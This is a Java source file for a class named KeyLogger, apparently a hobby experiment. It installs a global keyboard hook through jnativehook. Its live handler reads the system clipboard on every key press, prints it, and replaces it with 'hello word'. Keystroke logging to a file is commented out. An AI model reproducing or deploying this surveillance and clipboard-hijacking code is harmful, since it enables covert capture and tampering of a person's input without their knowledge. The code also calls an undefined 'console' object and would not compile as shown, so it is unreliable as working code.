package utils;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;

/**
 * @author vakho
 */
public class KeyLogger implements NativeKeyListener {

    private static final Path file = Paths.get("keys.txt");
//	private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
	List<String> keylog = new ArrayList<String>();
	String temp = "";
    public static void main(String[] args) {

//		logger.info("Key logger has been started");

        init();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            console.error(e.getMessage());
            System.exit(-1);
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

    public static void startKeyLoger() {
        init();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
//            console.error(e.getMessage());
            System.exit(-1);
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

    private static void init() {

        // Get the logger for "org.jnativehook" and set the level to warning.
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
//		logger.setLevel(Level.WARNING);

        // Don't forget to disable the parent handlers.
        logger.setUseParentHandlers(false);
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
//        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
//		console.warn(keyText);
////		System.out.println(e.getKeyChar());
//        if (keyText.length() > 1) {
//			keylog.add(temp);
////				temp += "[" + keyText + "]";abcd aukhanhtoan d
//			temp = "";
//			return;
//        } else {
//			temp += keyText;
//        }
//		console.info(keylog.toString());
		Clipboard c = Toolkit.getDefaultToolkit().getSystemClipboard();

		// Get data stored in the clipboard that is in the form of a string (text)
		try {
			System.out.println(c.getData(DataFlavor.stringFlavor));
            c.setContents(new StringSelection("hello word"), null);
		} catch (UnsupportedFlavorException ex) {
			throw new RuntimeException(ex);
		} catch (IOException ex) {
			throw new RuntimeException(ex);
		}
	}

    public void nativeKeyReleased(NativeKeyEvent e) {
        // Nothing Tây đẹp tâ â
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        // Nothing here
    }
}
